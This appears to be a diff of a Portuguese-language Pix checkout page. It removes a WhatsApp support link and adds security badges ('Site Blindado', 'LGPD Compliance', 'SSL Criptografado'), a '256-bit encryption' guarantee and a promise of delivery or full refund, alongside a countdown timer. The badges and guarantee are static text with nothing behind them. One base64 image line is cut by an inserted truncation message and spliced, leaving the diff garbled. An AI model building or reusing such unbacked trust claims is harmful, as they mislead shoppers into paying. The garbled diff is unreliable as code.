@@ -29,7 +29,7 @@
 </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Opções de Pagamento | Pagamento Seguro</title>
+    <title>Pagamento Seguro | Finalizar Pedido</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
@@ -450,13 +450,13 @@
         .pix-info{background:var(--white);border:1px solid var(--border);border-radius:12px;padding:14px 16px;display:flex;flex-direction:column;gap:8px; margin: 0 16px 20px;}
         .pix-info div{font-size:12px;color:var(--ink2);padding-left:4px;border-left:2px solid var(--green); text-align: left;}
 
-        /* MELHORIAS DE CONVERSÃO */
+        /* MELHORIAS DE CONVERSÃO E CREDIBILIDADE */
         .timer-container {
             background: #fff5f5;
             border: 1px solid #feb2b2;
             border-radius: 12px;
             padding: 12px;
-            margin: 0 16px 16px;
+            margin: 16px 16px 16px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -471,22 +471,6 @@
             70% { box-shadow: 0 0 0 6px rgba(197, 48, 48, 0); }
             100% { box-shadow: 0 0 0 0 rgba(197, 48, 48, 0); }
         }
-        .whatsapp-support {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin: 0 16px 40px;
-            padding: 14px;
-            background: #25d366;
-            color: white;
-            border-radius: 12px;
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 14px;
-            transition: transform 0.2s;
-        }
-        .whatsapp-support:active { transform: scale(0.98); }
         
         .stock-notice {
             font-size: 11px;
@@ -495,6 +479,71 @@
             margin-top: 4px;
             font-weight: 500;
         }
+
+        .security-bar {
+            background: #f8fafc;
+            border-top: 1px solid var(--border);
+            border-bottom: 1px solid var(--border);
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 0;
+        }
+        .security-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 10px;
+            font-weight: 700;
+            color: #64748b;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .security-item i { color: #16a34a; font-size: 12px; }
+
+        .trust-seals {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+            padding: 20px 16px 40px;
+            opacity: 0.7;
+        }
+        .trust-seal {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            text-align: center;
+        }
+        .trust-seal i { font-size: 20px; color: #94a3b8; }
+        .trust-seal span { font-size: 9px; font-weight: 700; color: #94a3b8; text-transform: uppercase; }
+
+        .guarantee-box {
+            background: #f0f9ff;
+            border: 1px solid #bae6fd;
+            border-radius: 12px;
+            padding: 14px;
+            margin: 0 16px 20px;
+            display: flex;
+            gap: 12px;
+            align-items: flex-start;
+        }
+        .guarantee-icon {
+            width: 36px;
+            height: 36px;
+            background: #e0f2fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0369a1;
+            flex-shrink: 0;
+        }
+        .guarantee-content h4 { font-size: 13px; font-weight: 700; color: #0369a1; margin-bottom: 2px; }
+        .guarantee-content p { font-size: 11px; color: #0c4a6e; line-height: 1.4; }
 
         @keyframes spin {
             to { transform: rotate(360deg); }
@@ -811,9 +860,14 @@
     <div id="pixScreen">
         <header class="hdr">
           <div class="hdr-space"></div>
-          <span class="hdr-title">Finalizar Pedido</span>
+          <span class="hdr-title">Pagamento via Pix</span>
           <div class="hdr-space"></div>
         </header>
+
+        <div class="security-bar">
+            <div class="security-item"><i class="fas fa-shield-alt"></i> Ambiente Seguro</div>
+            <div class="security-item"><i class="fas fa-lock"></i> SSL Criptografado</div>
+        </div>
 
         <div class="timer-container">
             <i class="fas fa-clock"></i>
@@ -827,14 +881,15 @@
 
         <div class="pix-qr-wrap">
           <div class="pix-qr-logo">
-            <img src="data:image/webp;base64,UklGRi4EAABXRUJQVlA4WAoAAAAQAAAAYwAAYwAAQUxQSDsBAAABDzD/ERECciRJbiPw5JPKgDVlTYNyDPBkTeDzxAYqgmj0UBkQ0X8Hbts4knavVznxJ5rnHaW1/LBzVL4dsDd0kAwTZPdJcB+8APa7cF9Vr7xvWcAJghPsVpLTc4JlpbV64PScYBXejZ4TBCfYKSnA+wUx3JRW3UuOKrjkVX3Wu7SXK4W9vruwvpQ0xRnyD1ntRkiVVlP8hv0iSf7IM9+aZJVXR1gFF/nMrPLINxdgr+kU8U3KLElkndyYqlBkCKserbJvEC4Sr+avtJMFXou2WPJGtiChYTPRgKLoJhtqEHcwiGBEwfCCsfqBB6sQLEmwPsFi3bByVdIZeb+pXLf3qdOinG9qgLIPKhSUK6idL2RQ1UD2xj5t9G5Kq6reRlD1nGCzpYieE8yGTvSc4N6x8O34YecobfO8owEAVlA4IMwCAACQEgCdASpkAGQAPplCmUgkpaQjLxb8ALATCWRs8v+9/FqG1F7OLfunle1XWFN67xOeml5lPPY6JnqgN5mv0D8AMr/fk7v8z/bs865ZmUj3CkBWID3ym0U2nfJ+x2aGAWZ8tgCthFdo9+mHWAUlE5F5rHrS447wEn6PH6cwOTendP+haPRLMpCShzXcQoVEx3uEAL7MK5Z7Gx3gn7AAAP78XNBkPzl141BeM7Afunok939y5lO8YRyvxpvrzmdGJlR/sEghqiQDhVlruoR5OSrAjlkP0d1jS/FI1DgafJJpPxD/m67pZ1DZYNPdybpGXz/vB0F+/2J55+UzahGPdFRv4zU8GdDWz2Xy+4o815V9tFOHsxSjb6BeaHjBj+iOoAGSqp0wnKF6N5bjZ+8HFnwroupw0KzWDD9KA0Za06WmP5c7rG24QGuKSx1NEyDMgi6/avlKURedSxXaU97zyfBy312PGQoP75qSts9LNvSPVvbJHtI60NUASh85kNbR/sVk5jLApj/w6yr7+wa1zZ2TrkGjq49oyc2laSuySJ/B1lFkDh2j8AFD1NudIEiwrqhxgZ+iJ+U977QiMBOY9hZkdY0+SeZ8QDu7Lt2YWqsP4bsWG+vLqH6Abc8CM6OyoZiuG+RfgUUAStUOi0YM8M6E/KHirvW+PpFUpI0enLWnpwLAJ6DBsvFuW0Az4Z3yBeFcWOtpOkO8WEXg/+v+l//+8F3yHAK8lx6zOQuxIcWiWAhgpjTasRy/7WtDeTSnQ5LtlKMXAJ/VhTaa/FG75TItodOqxa1gDWTgyfmoOqJFkP05rXhymZtoujAG18jw+JsEN6NaJfizf1038VdXTv1Io04QHkb1w16A/B71Xyk2/D3i6lifRLo50pF/LKlsFOxfMYZvmvJ2s6HnA53788N1iB/um02o/ywoCYxGteeZhQVbZqD4AAAAAAAAAA==" style="width:32px;height:32px;object-fit:contain">
+            <img src="data:image/webp;base64,UklGRi4EAABXRUJQVlA4WAoAAAAQAAAAYwAAYwAAQUxQSDsBAAABDzD/ERECciRJbiPw5JPKgDVlTYNyDPBkTeDzxAYqgmj0UBkQ0X8Hbts4knavVznxJ5rnHaW1/LBzVL4dsDd0kAwTZPdJcB+8APa7cF9Vr7xvWcAJghPsVpLTc4JlpbV64PScYBXejZ4TBCfYKSnA+wUx3JRW3UuOKrjkVX3Wu7SXK4W9vruwvpQ0xRnyD1ntRkiVVlP8hv0iSf7IM9+aZJVXR1gFF/nMrPLINxdgr+kU8U3KLElkndyYqlBkCKserbJvEC4Sr+avtJMFXou2WPJGtiChYTPRgKLoJhtqEHcwiGBEwfCCsfqBB6sQLEmwPsFi3bByVdIZeb+pXLf3qdOinG9qgLIPKhSUK6idL2RQ1UD2xj5t9G5Kq6reRlD1nGCzpYieE8yGTvSc4N6x8O34YecobfO8owEAVlA4IMwCAACQEgCdASpkAGQAPplCmUgkpaQjLxb8ALATCWRs8v+9/FqG1F7OLfunle1XWFN67xOeml5lPPY6JnqgN5mv0D8AMr/fk7(Content truncated due to size limit. Use line ranges to read remaining content)
+8BAAABDzD/ERECciRJbiPw5JPKgDVlTYNyDPBkTeDzxAYqgmj0UBkQ0X8Hbts4knavVznxJ5rnHaW1/LBzVL4dsDd0kAwTZPdJcB+8APa7cF9Vr7xvWcAJghPsVpLTc4JlpbV64PScYBXejZ4TBCfYKSnA+wUx3JRW3UuOKrjkVX3Wu7SXK4W9vruwvpQ0xRnyD1ntRkiVVlP8hv0iSf7IM9+aZJVXR1gFF/nMrPLINxdgr+kU8U3KLElkndyYqlBkCKserbJvEC4Sr+avtJMFXou2WPJGtiChYTPRgKLoJhtqEHcwiGBEwfCCsfqBB6sQLEmwPsFi3bByVdIZeb+pXLf3qdOinG9qgLIPKhSUK6idL2RQ1UD2xj5t9G5Kq6reRlD1nGCzpYieE8yGTvSc4N6x8O34YecobfO8owEAVlA4IMwCAACQEgCdASpkAGQAPplCmUgkpaQjLxb8ALATCWRs8v+9/FqG1F7OLfunle1XWFN67xOeml5lPPY6JnqgN5mv0D8AMr/fk7v8z/bs865ZmUj3CkBWID3ym0U2nfJ+x2aGAWZ8tgCthFdo9+mHWAUlE5F5rHrS447wEn6PH6cwOTendP+haPRLMpCShzXcQoVEx3uEAL7MK5Z7Gx3gn7AAAP78XNBkPzl141BeM7Afunok939y5lO8YRyvxpvrzmdGJlR/sEghqiQDhVlruoR5OSrAjlkP0d1jS/FI1DgafJJpPxD/m67pZ1DZYNPdybpGXz/vB0F+/2J55+UzahGPdFRv4zU8GdDWz2Xy+4o815V9tFOHsxSjb6BeaHjBj+iOoAGSqp0wnKF6N5bjZ+8HFnwroupw0KzWDD9KA0Za06WmP5c7rG24QGuKSx1NEyDMgi6/avlKURedSxXaU97zyfBy312PGQoP75qSts9LNvSPVvbJHtI60NUASh85kNbR/sVk5jLApj/w6yr7+wa1zZ2TrkGjq49oyc2laSuySJ/B1lFkDh2j8AFD1NudIEiwrqhxgZ+iJ+U977QiMBOY9hZkdY0+SeZ8QDu7Lt2YWqsP4bsWG+vLqH6Abc8CM6OyoZiuG+RfgUUAStUOi0YM8M6E/KHirvW+PpFUpI0enLWnpwLAJ6DBsvFuW0Az4Z3yBeFcWOtpOkO8WEXg/+v+l//+8F3yHAK8lx6zOQuxIcWiWAhgpjTasRy/7WtDeTSnQ5LtlKMXAJ/VhTaa/FG75TItodOqxa1gDWTgyfmoOqJFkP05rXhymZtoujAG18jw+JsEN6NaJfizf1038VdXTv1Io04QHkb1w16A/B71Xyk2/D3i6lifRLo50pF/LKlsFOxfMYZvmvJ2s6HnA53788N1iB/um02o/ywoCYxGteeZhQVbZqD4AAAAAAAAAA==" style="width:32px;height:32px;object-fit:contain">
             <div>
               <div class="pix-title">Pague com PIX</div>
               <div class="pix-sub">Escaneie o QR Code ou copie o código</div>
             </div>
           </div>
           <div id="pixQrCode" class="pix-qr-img-container"></div>
-          <div class="stock-notice">⚠️ Estoque reservado por tempo limitado.</div>
+          <div class="stock-notice">⚠️ Seu pedido está reservado e aguardando o pagamento.</div>
         </div>
 
         <div class="pix-divider"><span>ou copie o código abaixo</span></div>
@@ -846,20 +901,38 @@
 
         <div class="pix-aguardando">
           <div class="pix-dot-loader"><span></span><span></span><span></span></div>
-          <span>Aguardando pagamento...</span>
+          <span>Aguardando confirmação do banco...</span>
+        </div>
+
+        <div class="guarantee-box">
+            <div class="guarantee-icon"><i class="fas fa-check-double"></i></div>
+            <div class="guarantee-content">
+                <h4>Pagamento com Garantia Total</h4>
+                <p>Seu pagamento é processado com criptografia de 256 bits. Garantimos a entrega do seu pedido ou a devolução integral do valor.</p>
+            </div>
         </div>
 
         <div class="pix-info">
           <div>1. Abra o app do seu banco</div>
           <div>2. Escolha pagar com PIX</div>
           <div>3. Escaneie o QR Code ou cole o código</div>
-          <div>4. Confirme e pronto — seu pedido é separado automaticamente</div>
+          <div>4. O pagamento é aprovado instantaneamente</div>
         </div>
 
-        <a href="https://wa.me/5500000000000?text=Preciso+de+ajuda+com+meu+pedido" class="whatsapp-support" target="_blank">
-            <i class="fab fa-whatsapp"></i>
-            Precisa de ajuda? Fale conosco
-        </a>
+        <div class="trust-seals">
+            <div class="trust-seal">
+                <i class="fas fa-shield-virus"></i>
+                <span>Site Blindado</span>
+            </div>
+            <div class="trust-seal">
+                <i class="fas fa-user-shield"></i>
+                <span>LGPD Compliance</span>
+            </div>
+            <div class="trust-seal">
+                <i class="fas fa-certificate"></i>
+                <span>Compra Segura</span>
+            </div>
+        </div>
     </div>
 
     <div class="modal-overlay" id="delivery-modal">
@@ -1220,7 +1293,6 @@
                 correctLevel: QRCode.CorrectLevel.H
             });
 
-            // Inicia cronômetro de 15 minutos
             const fifteenMinutes = 60 * 15;
             const display = document.querySelector('#pixTimer');
             startTimer(fifteenMinutes, display);
